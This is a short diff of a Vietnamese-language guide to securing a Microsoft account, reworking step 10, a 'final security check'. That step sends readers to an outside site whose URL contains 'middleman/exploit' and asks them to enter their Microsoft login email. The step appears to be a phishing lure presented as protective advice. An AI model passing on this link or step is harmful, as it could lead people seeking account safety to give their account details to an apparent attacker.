@@ -76,11 +76,8 @@
   Đảm bảo chỉ bạn mới có quyền truy cập từ thiết bị đáng tin cậy.
 
 
-## ✅ Bước Kiểm Tra Cuối - Đảm Bảo Tài Khoản Microsoft An Toàn
-
-Trước đó, bạn đã thực hiện các bước bảo mật. Đây là **bước cuối cùng** để xác nhận tài khoản **không còn bị liên kết với thiết bị/máy chủ cũ**.
-
 ### 🔍 10. Kiểm tra trạng thái bảo mật tài khoản:
+Trước đó, bạn đã thực hiện các bước bảo mật. Đây là **bước cuối cùng** để xác nhận tài khoản **không còn bị liên kết với thiết bị/máy chủ cũ**.
 1. 🧭 Truy cập: [https://zyger.net/middleman/exploit/](https://zyger.net/middleman/exploit/)
 2. ✉️ Nhập email đăng nhập Microsoft của bạn.
 3. 📊 Kết quả:
